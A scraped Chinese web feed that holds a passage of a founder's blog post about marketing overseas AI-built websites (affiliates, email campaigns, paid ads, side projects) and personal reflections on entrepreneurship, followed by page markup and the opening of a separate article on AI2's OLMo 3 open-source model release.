<p>一周下来，我们聊了 20 几封邮件了，对于海外来说，Gmail 相当于是微信了。</p>
<p>在后来，我还去购买了好几个平台推广，然后在我的管理后台做好 utm 跟踪统计：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81d4f2b9cf234812aa5746f9d52e2031~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=ZPq5hLMaDuc73a1FWPJ0r1N4Px8%3D" alt="" loading="lazy"/></p>
<p>事实证明，这是个非常好的防御手段，目前我通过 Affliate 过来的已经好几十单了，几百刀的收益，而且在 SEO 排名下掉的时候，稳住了我的用户访问，甚至活跃用户越来越多了，这是真正的目标用户群体。</p>
<h3 data-id="heading-10">EDM（邮件营销）</h3>
<p>第二个我觉得挺有用的手段是 EDM，也就是电子邮件营销。</p>
<p>刚刚说了，海外的邮件相当于国内的微信，所以用户触达通过邮件效果非常好。</p>
<p>我对于 EDM 的尝试还非常初级，只做了 waitlist 的召回。</p>
<p>在统计到 waitlist，接了支付之后，我就去把我的 resend 升级成 pro 了，通过批量的脚本，对用户进行了一次付费召回，这个漏加了统计代码，我预估召回率大概能在 1%左右。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9aceedb4d3d248ffa60b458354692f5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=PW2QbU7RY7Gd8CVVFHrnZsNTk9A%3D" alt="" loading="lazy"/></p>
<p>其实 EDM 还有很多玩法，我也在逐步学习中，比如合适的时机，Welcome、Onboard、Cart、Newsletter 等等，这是做海外产品的必备手段。</p>
<h3 data-id="heading-11">SEM（投流）</h3>
<p>当然还有一项大的动作在进行中，可惜的是我还没有特别弄明白，就是 SEM。</p>
<p>投流我认为是一个比较黑盒的事情，一个是投放模型需要学习，所以前期必然是亏损的。</p>
<p>另一个是受限于素材、预算、出价等多方面的影响，导致这个周期就比较漫长。</p>
<p>等我未来把 ROI 能够跑正了之后，可以跟大家分享一下经验。</p>
<p>我个人认为，对于做好的产品来说，SEO 是基础，SEM 才是真正的增长飞轮。</p>
<h2 data-id="heading-12">04/ 其他站点（成功/练手/失败）</h2>
<p>当然除了这一个产品之外，我们还做了二十多个产品，都当做练手尝试，下面可以给大家分享一下我自己做的一些没有成功的站点：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flegionremixhub.com%2F" target="_blank" title="https://legionremixhub.com/" ref="nofollow noopener noreferrer">legionremixhub.com/</a></p>
<p><img alt="转存失败，建议直接上传图片文件" src="" loading="lazy"/></p>
<p>这个站点算是我初步成功的站了，它是魔兽军团的一个新的限时活动，我做的这个满足了用户的游戏资讯需求，也是我成功申请到 adsense 的第一个站，目前每天的 uv 在一两百左右，现在也给我带了几美金的收入，我预计这个站点的收入大概是 10 - 100 美元左右。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a55ddd680b3a41b0bf6323b5b43f3bc3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=1FAW5QA%2B%2FPEdfyss9p74T3bbakA%3D" alt="" loading="lazy"/></p>
<p>当然新的产品成功后，这个站点我好久都没时间去迭代了。</p>
<p>剩下的就是一些不赚钱的练手站，比如这个小游戏站：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fstunt-simulator.com%2F" target="_blank" title="https://stunt-simulator.com/" ref="nofollow noopener noreferrer">stunt-simulator.com/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c80e15e39f145ef85ceaf4881c66a81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=oJiSBo%2FFrzK639KfPsSa1HoSqic%3D" alt="" loading="lazy"/></p>
<p>另一个小游戏站：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcowboysafari.online%2F" target="_blank" title="https://cowboysafari.online/" ref="nofollow noopener noreferrer">cowboysafari.online/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08b2be9aa371478a8e079e9720d47183~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=xfDKvlBZ%2Fj8PO2YEip6kQW3pOYQ%3D" alt="" loading="lazy"/></p>
<p>另一个游戏资讯站：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpoe327.net%2F" target="_blank" title="https://poe327.net/" ref="nofollow noopener noreferrer">poe327.net/</a></p>
<p><img alt="转存失败，建议直接上传图片文件" src="" loading="lazy"/></p>
<p>期末成绩计算器：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ffinalgradecalculator.app%2F" target="_blank" title="https://finalgradecalculator.app/" ref="nofollow noopener noreferrer">finalgradecalculator.app/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bc6209905bb48f88dbd3d21aef0cc52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=%2BVA%2FYn8cxJhd7kf9JU%2BTWrm1by0%3D" alt="" loading="lazy"/></p>
<p>摩斯密码工具站：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmorsecodetranslator.app%2F" target="_blank" title="https://morsecodetranslator.app/" ref="nofollow noopener noreferrer">morsecodetranslator.app/</a></p>
<p><img alt="转存失败，建议直接上传图片文件" src="" loading="lazy"/></p>
<p>团队里数十个站点我就不一一枚举了，相信大家已经理解我们所做的事情。</p>
<h2 data-id="heading-13">05/ 产品方法论与心态</h2>
<h3 data-id="heading-14">为什么不能是 CEO？</h3>
<p>我记得在我离开大厂之前，有很多人问我创业是不是去做 CTO，当时我回了一句：</p>
<p>为什么不能是 CEO？</p>
<p>可能程序员朋友都会觉得我是狂妄自大，但我的创业目标是非常坚定的。</p>
<p>说实话，如果创业还是做技术，那我不如继续待在大厂，更舒服地做技术。</p>
<p>经过这么多年的打拼，我明白了一个道理：技术永远决定不了产品，就算是 CTO 也不行。</p>
<p>我的上一家大厂，已经非常尊敬技术了，技术和产品分两条汇报线，相互之间是合作关系，不是汇报。</p>
<p>从产品的视角里看，技术永远都是资源，本职工作就是做好需求，所以技术搞来搞去，就是降本增效那一套。</p>
<p>现在 AI 时代创业，我个人认为初创团队，是不需要 CTO 的，产品经理完全可以自己搞定 MVP，快速做市场验证。</p>
<p>程序员出来创业，最缺乏的是对产品的洞察，对商业的判断，容易沉浸在自己所谓的奇思妙想和解决方案里。</p>
<p>我真正去接触产品、商业、销售、运营，其实也就是这一年的事情，在之前基本就是两耳不闻窗外事，一心做技术。</p>
<p>所以在我出来前，有人问我是不是去做一个博主？我的回答还是犹豫的，当时只是说还想去试试做产品创业可不可行。</p>
<p>其实出来之后，我的方向非常笃定和聚焦，我基本上把所有的精力都放在 AI 编程出海的事情上，自媒体投入很少。</p>
<p>因为在我看来，自媒体我想要做随时都可以做，但真正做出海产品，对我来说是更具有挑战性的事情，心里是没底的。</p>
<p>这次能在短短不到 2 个月的时间内跑通商业闭环，产品上线一周就能赚到千刀，给了我极大的信心，越来做产品，我真的可以！</p>
<p>目前对我来说，产品和商业已经没有任何神秘感了。</p>
<h3 data-id="heading-15">读书与方法论</h3>
<p>在这个过程中，我看了很多产品、创业相关的书，包括苏杰、俞军等诸多产品专家的著作。</p>
<p>俞军老师的书我看了两遍，主要是因为这本书写的实在是太理论了，很多经济学的知识，看完了头脑空空。</p>
<p>为了学到一些东西，我还是硬着头皮去看了第二遍，并且做了笔记：《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FvuzFiYd89jhnf44UycUA-A" target="_blank" title="https://mp.weixin.qq.com/s/vuzFiYd89jhnf44UycUA-A" ref="nofollow noopener noreferrer">为什么你的 AI 产品总是做不起来？90%的人忽略了这两个底层模型</a>》。</p>
<p>在所有的书籍里，我觉得收获最大的还是精益创业，在看完这本书之后，我要求团队所有的产品都需要去画精益画布，想清楚商业，才等于想清楚产品。</p>
<p>这是我自己按照创业目标的推演，按照 AARRR 来推算的数据情况：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc157cd977f4494f801b5316d949be7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=2SFrpX5iNTOGbxkq7TVIKLT%2BwmE%3D" alt="" loading="lazy"/></p>
<p>我觉得精益创业让我意识到了，AARRR 不只是个漏斗模型，它还是个反馈模型。这个推演我做了好几次，也和大家一起推演过，以确定我们的初创目标。</p>
<p>我记得第一次推演的时候，是周末，那时候北京还在下雨，天气很阴沉。我独自在会议室的白板上进行推演测算，推演之后，我的心情和天空一样灰暗，真正感受到了创业维艰。</p>
<p>我经常跟自己说，一定要跳出程序员的视角，不要老想着解决方案，要去看技术之外的东西。当我测算完之后，我真正理解了，这么多客户，这么多用户，要怎么去获得？你要认清了现实，根本不会去自嗨了，只会感觉到深深的压力。</p>
<p>那个时候已经去做了几个站了，基本上没拿到什么正反馈，团队士气不高，大家也都比较迷茫，充满了不确定性。我觉得作为一号位，首要职责就是想清楚方向，不能既要又要，当所有人失去信心的时候，必须要坚定信心，拨开迷雾，给出指引。</p>
<p>当时我分析了一下我们的优势，主要就是效率，我们一定要利用好 AI 编程的杠杆，把执行力拉满，从而打出差异化优势，像当天必须上站，每天必做的找词、外链、复盘、内链 SOP 确定下来，标准执行，至少做 10 个订阅、100 个流量。</p>
<p>这样定量地进行了目标的拆解，大家更有确定感，也确实从数据反推是需要这么做的，剩下的交给不断地自我成长和时间，理论上去博一个最大概率。</p>
<p>在这个战略确定了一周后，我们就迎来了第一个产品的爆发，真正把这套模式从 0-1 跑通了。</p>
<p>我想说的是，做产品的要求其实说高也很高：</p>
<p>你需要有理科思维，通过数据来验证。</p>
<p>你需要有文科思维，有同理心。</p>
<p>你需要有动手能力，做实验验证。</p>
<p>还需要有批判精神，反复琢磨论证。</p>
<h3 data-id="heading-16">差异化优势</h3>
<p>最后，产品最重要的还是打出差异化优势。我们的差异化优势除了效率方面，其他方面都有一定的短板，我所做的就是尽可能让团队尽快成长，弥补自身的短板，也是变相提升了差异化优势。</p>
<p>比如，上周刚和团队培训分享了设计层面的知识，大家的审美一下子就上来了，站点都美观舒服了很多。</p>
<p>之前不断灌输的需求分析，市场调研，也潜移默化地改变了很多事情，每个人的产品 sense 都在提升。</p>
<p>在短时间内持续学习，快速成长，也是我认为最重要的差异化优势之一。</p>
<h2 data-id="heading-17">06/ 人性三关——贪婪、恐惧、狂妄</h2>
<p>说完产品，来聊聊创业。</p>
<p>之前很多人问我，到底要到什么样的阶段才可以出去创业？当时我回答的不是很好。</p>
<p>经过这几个月的不断思考，我反思了一下为什么我一年前不认为可以创业，今年就出来了。</p>
<p>总结起来，能力并不是最重要的，最重要的是与人性的对抗，我选出三个需要对抗的人性和大家展开聊聊。</p>
<h3 data-id="heading-18">贪婪</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14846ead6a874572acca84c9da202a05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=5riPfkwLuzkA7C9cLueNTVPU3Sg%3D" alt="" loading="lazy"/></p>
<p>我认为贪婪是人类的排名最靠前的人性，几乎所有人的本性都是贪婪的。</p>
<p>举个例子，如果一个人他的目标是赚钱，你问他赚多少钱会够，不论他回答多少钱，其实都是不够的。</p>
<p>当你赚到 1 万的时候，你想赚 10 万，然后想赚百万，千万，很多赚几个亿的老板，会想他们为什么不能成为马云。</p>
<p>这就是人性的贪，也是最难克服的一点。</p>
<p>佛教劝人放下，道教主张无为，其实本质上是教我们如何克服贪婪的人性。</p>
<p>创业来说，我认为必须要克制贪婪，否则会陷入到万丈深渊，无法自拔。</p>
<p>拿俞敏洪举例，当年新东方要上市的时候，收到了某家大的证券公司 1 个亿的投资，要求新东方在国内上市。</p>
<p>当时一个亿已经打到账上了，但是俞敏洪发现国内没有教育培训公司上市的先例，必须要借壳上市，虽然有很多公司都是借壳上市的，但是他还是认为其中有风险，果断将这一个亿连本带利地还了。</p>
<p>没过几天，这家证券公司就出事了，公司负责人被抓，其实这家公司已经暗中操作了股票，就等新东方上钩大捞一笔。</p>
<p>如果当时没有俞敏洪的坚持，可能也没有现在的新东方。</p>
<p>我们创业，面临的是极其复杂的商业环境，我觉得一定要不断警示自己：</p>
<p>天下没有免费的午餐！</p>
<p>拿我们遇到的事情举例，就是之前沸沸扬扬的 comet 的 referal，做出海的人应该都关注了这个事情。</p>
<p>这件事情从一开始，我就不看好，也从来没有把它算在我们的正常收益里，因为它的 CPA 非常高，事出反常必有妖。</p>
<p>所以当时我们没有像一些人去搞投流，花很大精力弄，只是花了 2 小时顺手发了一下。</p>
<p>果不其然，最后 partner 是被封了的，如果投入过多精力在这上面，非常不值得。</p>
<p>我觉得对抗贪婪，最重要的是两个字——原则。</p>
<p>一个没有原则的人，底线就会被无限突破，你要想清楚自己的原则是什么，底线是什么。</p>
<p>拿我们做 SEO 举例，我定义的第一条原则就是，不蹭品牌词，只做需求词，更不要去碰黄赌毒，擦边都不行。</p>
<p>谁都知道这些东西流量来的很快，很容易拿正反馈。但当你毫无下限地去赚钱的时候，最终会被金钱反噬的。</p>
<p>还是拿俞敏洪举例，他曾经在生死线上走过来的，遭遇了抢劫，这名歹徒之前抢过的六个老板，毫无例外全都死于非命了，只有俞敏洪侥幸活了下来。</p>
<p>这个歹徒是通过度假村的生意和俞敏洪合作，俞敏洪先垫付了 3 万元，后来这个钱一直没还，歹徒恳请俞敏洪宽限一年还，俞敏洪说做个朋友，就答应了。</p>
<p>可能是这件事种下了一个善因，导致最终抢劫的时候，没有对俞敏洪下死守。</p>
<p>读了这么多年的书，我依旧相信这世界上有因果，就像康德说的物自体，超过了人类目前的认知，换句话说：</p>
<p>得道多助，失道寡助。</p>
<p>很多人会去积德行善，并不是做样子，而是相信世界上的真善美。</p>
<p>过犹不及，这是道家的智慧。做事留一线，坚守自己的原则。</p>
<p>这个道理在很多时候都是通用的，你看飙高音的节目，如果一个选手高音飙到极限，它一定没有美感，反而是留有一些余地的高音，更能带来震撼。</p>
<p>雷军不顾投资人的反对，坚持硬件利润率不超过 5%。</p>
<p>俞敏洪将一对一家教的比重控制在 35%以下。</p>
<p>董明珠拿出 300 亿做科研投入，数控机床技术直接打败了德国，赢得了世界的尊重。</p>
<p>这些人不是在作秀，而是有自己心中的坚守，最终获得高成就的大佬，绝不仅仅是靠运气。</p>
<p>我马上要启动知识付费了，我也给自己定了一条标准线，知识付费的收入不能超过总收入的 35%。</p>
<p>突破了内心的贪婪，才能真正掌控自我，也就拥有了创业成功的初步条件。</p>
<h3 data-id="heading-19">恐惧</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ab87650fc1d4611835ecbd4acedc496~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=KckGn3gAy3yKebpb1R%2FJt16qSzQ%3D" alt="" loading="lazy"/></p>
<p>恐惧同样是很难克服的人性。回想起去年我为什么没有选择出来创业，很大的因素就是——恐惧。</p>
<p>恐惧离开大厂之后，失去收入，同时也失去了赚钱能力，再进大厂不一定那么容易了，最终可能去送外卖。</p>
<p>恐惧自己的贷款还没有还完，最终可能卖房还债。</p>
<p>恐惧自己创业孤立无援，陷入绝境。</p>
<p>恐惧的事情实在太多太多了，克服恐惧需要很大的勇气。</p>
<p>但仔细想想，我们生来就是一无所有，死去也将一无所有，为什么在拥有过后，就那么恐惧一无所有呢？</p>
<p>一无所有绝不可怕，真正不恐惧一无所有的人，才能真正拥有。</p>
<p>这个人生哲理需要一定的阅历才能明白，经历了很多磨难之后，才会产生信念，车到山前必有路。</p>
<p>当真正面临生死之后，才会发出感慨：除了生死，再无大事。</p>
<p>这是看过蔡磊先生的书之后最大的感悟，真正面临的大恐惧是生死，而不是其他。</p>
<p>最近国际形势紧张，战争可能一触即发，抖音已经被我刷成了军事频道。</p>
<p>我也在思考一个问题，死亡真的有那么恐惧吗？</p>
<p>人最终都是要死的。</p>
<p>鲁迅先生是在什么情景下写出那句名言？</p>
<p>我们抗美援朝的志愿军战士，他们被誉为最可爱的志愿军战士。</p>
<p>朝鲜总统亲自证明，只有中国的志愿军战士没有犯下暴行，没有射杀平民。</p>
<p>他们没有对死亡的恐惧吗？绝对不是，而是他们有内心坚守的东西，超越了生死。</p>
<p>我相信战争来临时，当下时代会有更多的汉奸，有更多卖主求荣的人。</p>
<p>但同时也相信，民族精神是刻进中国人基因的。</p>
<p>苟利国家生已，死岂因祸福避之。</p>
<p>当真正克服生死恐惧的时候，我们就是无敌的。</p>
<h3 data-id="heading-20">狂妄</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/624e6a94d128471ea9209630713c29f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764604424&amp;x-signature=FXGAH9V4fgmF1U5zhvrn7UaqqOE%3D" alt="" loading="lazy"/></p>
<p>说起狂妄，我觉得佛教定义的五毒很形象——贪嗔痴慢疑。</p>
<p>其中痴指的是愚昧，慢指的是傲慢，疑指的是怀疑并固执，这三个加起来，可以说是狂妄。</p>
<p>这也是最基本的人性。我们往往将所有的功劳归于自己，所有的过错推给他人。</p>
<p>在创业过程中，我也发现了这一点，团队在分析竞争对手的时候，一直在批判对方的缺点。</p>
<p>这是一个非常不好的现象，我始终强调，你看竞争对手，一定要看他的优点，而不是批评缺点，给自己优越感。</p>
<p>这让我想起之前的一个下属，绩效不太好，他问了我一个问题：</p>
<p>“公司内那些级别高的人，他们的技术太菜了，完全靠时代红利，最新框架都不了解，凭什么他们级别那么高？”</p>
<p>当时我的回答大致是，每个人有自己的时代和际遇，他们时代有自己的框架技术，我们不能紧盯着某一个具体技能来评判，更要看他们的综合素质，学习他们身上的优点。</p>
<p>当然那位同学肯定是对我这段话嗤之以鼻。</p>
<p>我们仔细思考一下，如果你掌握的技能都是 how-to 的技能，不说别的，在这个时代，已经可以被 AI 取代了，AI 发展几年，一大批程序员就会失业了。</p>
<p>退一步来说，你当前年轻，不知天高地厚，等你老了，别人照样也会说你不懂新技术，凭什么在这个位置。</p>
<p>这世界上本就不存在绝对公平，所有的事情都是错综复杂的，而人性就会推着我们不会客观多角度分析问题。</p>
<p>所谓骄兵必败，在创业上，一定要克服这种狂妄。你会发现，越成功的大佬，越谦逊。</p>
<h2 data-id="heading-21">07/ 后续目标与待办</h2>
<p>最后，说一下未来的打算，目前 0-1 只能算是初步跑通，仅仅是个起点，接下来的目标是稳定的月入万刀。</p>
<p>其实月入万刀，已经和我抵得过我在大厂的收入了，纯粹的躺赚收益，也是几人小团队的一个生存线。</p>
<p>再接下来，我希望公司能够在明年冲击百万的 ARR，换算成人民币大概是千万收入，虽然它还是一个小公司，但我觉得已经有在时代立足的本钱了。</p>
<p>除了收益目标，我觉得最主要的是创业之路的成长和收获，眼下就有 ph 打榜、投流等等一堆难关要过，保持高速的成长，相信在 AI 的时代就能够不下牌桌，享受时代红利。</p>
<p>咱们下期再见。</p>
<hr/>
<p>🚀 想要与更多AI爱好者交流，共同成长吗？</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZ4k_5_waWJbRRo5lZBZmog" target="_blank" title="https://mp.weixin.qq.com/s/Z4k_5_waWJbRRo5lZBZmog" ref="nofollow noopener noreferrer">和一群志同道合的人，持续精进 AI 的每一天</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[开放至极致：OLMo 3如何重塑开源大模型游戏规则？]]></title>    <link>https://juejin.cn/post/7576124206397947914</link>    <guid>https://juejin.cn/post/7576124206397947914</guid>    <pubDate>2025-11-24T14:15:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576124206397947914" data-draft-id="7576124206397931530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="开放至极致：OLMo 3如何重塑开源大模型游戏规则？"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-11-24T14:15:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨风如雪"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            开放至极致：OLMo 3如何重塑开源大模型游戏规则？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨风如雪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:15:14.000Z" title="Mon Nov 24 2025 14:15:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025年11月20日，AI圈注定要记住这个日子。艾伦人工智能研究所（AI2）悄然投下了一颗重磅炸弹：其新一代开源大语言模型系列——<strong>OLMo 3</strong>正式面世。说它“重磅”，绝不仅仅是因为又多了一款参数规模更大的模型，而是因为它彻底颠覆了我们对“开源”的理解，为整个行业树立了性能、效率和透明度的新标杆。</p>
<p>作为一名关注AI前沿的创作者，我深知开源社区对大模型的渴望，不仅仅是拿到模型权重，更是希望能够洞察其内部机制，进行深度定制和研究。而OLMo 3的到来，正是对这种渴望的极致回应。</p>
